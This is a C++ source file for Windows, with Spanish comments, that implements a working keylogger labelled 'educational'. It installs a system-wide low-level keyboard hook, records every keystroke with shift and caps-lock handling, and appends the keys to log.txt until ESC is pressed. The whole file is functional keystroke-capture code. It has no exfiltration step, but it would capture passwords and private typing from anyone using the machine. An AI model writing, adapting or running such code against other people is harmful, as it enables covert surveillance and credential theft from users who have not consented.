#include <bits/stdc++.h>
#include <windows.h>

using namespace std;

HHOOK keyboardHook; // Manejador del gancho del teclado
string logFileName = "log.txt"; // Nombre del archivo donde se guardarn las teclas

// ganchazo
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);


int main() {
    // Muestra un mensaje en la consola para indicar que el keylogger esta activo.
    cout << "Keylogger educativo activado. Presiona ESC en la ventana de consola para detenerlo." << endl;
    cout << "Las teclas se guardaran en '" << logFileName << "'." << endl;

    // Instala el gancho del teclado a nivel de sistema (WH_KEYBOARD_LL).
    // GetModuleHandle(NULL) obtiene el manejador del módulo actual (nuestro ejecutable).
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);

    // checar
    if (keyboardHook == NULL) {
        cerr << "Error: No se pudo instalar el gancho del teclado." << endl;
        return 1;
    }

    // Bucle de mensajes. Es necesario para que el gancho funcione.
    // El programa se quedará esperando eventos del sistema.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        // Permite detener el programa presionando ESC en esta consola.
        if (GetAsyncKeyState(VK_ESCAPE) & 0x0001) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // quitar
    UnhookWindowsHookEx(keyboardHook);
    cout << "Keylogger detenido." << endl;

    return 0;
}


LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // procesar el mensaje.
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // información sobre la tecla.
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbdStruct->vkCode; 
            ofstream logFile(logFileName, ios::app);

            switch (vkCode) {
                case VK_RETURN: logFile << "[ENTER]\n"; break;
                case VK_SPACE:  logFile << " "; break;
                case VK_BACK:   logFile << "[BACKSPACE]"; break;
                case VK_TAB:    logFile << "[TAB]"; break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT: logFile << "[SHIFT]"; break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL: logFile << "[CTRL]"; break;
                case VK_MENU: // ALT
                case VK_LMENU:
                case VK_RMENU: logFile << "[ALT]"; break;
                case VK_CAPITAL: logFile << "[CAPS_LOCK]"; break;
                case VK_ESCAPE: logFile << "[ESC]"; break;
                default:
                    
                    bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 1) != 0;

                    char key = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
                    
                    if (key != 0) {
                        //mayus y minus
                        if (isalpha(key)) {
                            if (isShiftPressed ^ isCapsLockOn) { // XOR
                                key = toupper(key);
                            } else {
                                key = tolower(key);
                            }
                        }
                        logFile << key;
                    }
                    break;
            }

            // Cerramos el archivo.
            logFile.close();
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}